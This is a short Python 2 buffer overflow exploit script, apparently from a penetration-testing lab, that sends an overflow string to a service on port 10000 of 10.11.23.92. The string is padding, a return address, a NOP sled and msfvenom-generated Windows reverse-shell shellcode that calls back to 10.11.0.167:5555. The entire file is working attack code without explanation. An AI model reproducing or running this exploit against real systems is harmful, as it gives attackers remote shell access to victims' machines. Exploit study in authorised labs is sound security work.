#!/usr/bin/python
import sys
import socket

# found bad chars- \x00
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.167 LPORT=5555 EXITFUNC=thread -f c -a x86 -b "\x00"
overflow = (
	"\xba\x9e\xca\x15\xe8\xda\xdd\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
	"\x52\x31\x55\x12\x03\x55\x12\x83\x73\x36\xf7\x1d\x77\x2f\x7a"
	"\xdd\x87\xb0\x1b\x57\x62\x81\x1b\x03\xe7\xb2\xab\x47\xa5\x3e"
	"\x47\x05\x5d\xb4\x25\x82\x52\x7d\x83\xf4\x5d\x7e\xb8\xc5\xfc"
	"\xfc\xc3\x19\xde\x3d\x0c\x6c\x1f\x79\x71\x9d\x4d\xd2\xfd\x30"
	"\x61\x57\x4b\x89\x0a\x2b\x5d\x89\xef\xfc\x5c\xb8\xbe\x77\x07"
	"\x1a\x41\x5b\x33\x13\x59\xb8\x7e\xed\xd2\x0a\xf4\xec\x32\x43"
	"\xf5\x43\x7b\x6b\x04\x9d\xbc\x4c\xf7\xe8\xb4\xae\x8a\xea\x03"
	"\xcc\x50\x7e\x97\x76\x12\xd8\x73\x86\xf7\xbf\xf0\x84\xbc\xb4"
	"\x5e\x89\x43\x18\xd5\xb5\xc8\x9f\x39\x3c\x8a\xbb\x9d\x64\x48"
	"\xa5\x84\xc0\x3f\xda\xd6\xaa\xe0\x7e\x9d\x47\xf4\xf2\xfc\x0f"
	"\x39\x3f\xfe\xcf\x55\x48\x8d\xfd\xfa\xe2\x19\x4e\x72\x2d\xde"
	"\xb1\xa9\x89\x70\x4c\x52\xea\x59\x8b\x06\xba\xf1\x3a\x27\x51"
	"\x01\xc2\xf2\xf6\x51\x6c\xad\xb6\x01\xcc\x1d\x5f\x4b\xc3\x42"
	"\x7f\x74\x09\xeb\xea\x8f\xda\x1e\xe0\x8f\xbd\x77\xf4\x8f\xd4"
	"\x34\x71\x69\xbc\x2a\xd4\x22\x29\xd2\x7d\xb8\xc8\x1b\xa8\xc5"
	"\xcb\x90\x5f\x3a\x85\x50\x15\x28\x72\x91\x60\x12\xd5\xae\x5e"
	"\x3a\xb9\x3d\x05\xba\xb4\x5d\x92\xed\x91\x90\xeb\x7b\x0c\x8a"
	"\x45\x99\xcd\x4a\xad\x19\x0a\xaf\x30\xa0\xdf\x8b\x16\xb2\x19"
	"\x13\x13\xe6\xf5\x42\xcd\x50\xb0\x3c\xbf\x0a\x6a\x92\x69\xda"
	"\xeb\xd8\xa9\x9c\xf3\x34\x5c\x40\x45\xe1\x19\x7f\x6a\x65\xae"
	"\xf8\x96\x15\x51\xd3\x12\x35\xb0\xf1\x6e\xde\x6d\x90\xd2\x83"
	"\x8d\x4f\x10\xba\x0d\x65\xe9\x39\x0d\x0c\xec\x06\x89\xfd\x9c"
	"\x17\x7c\x01\x32\x17\x55"
	)

crash = "A" * 263 + "\xf6\xb2\x14\x77" + "\x90" * 15 + overflow
shellcode = 'test ' + crash + '\r\n'

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('10.11.23.92',10000))
	message=shellcode
	s.send(message)
	s.close()

except:
	print "Error connecting to remote machine."
	sys.exit() 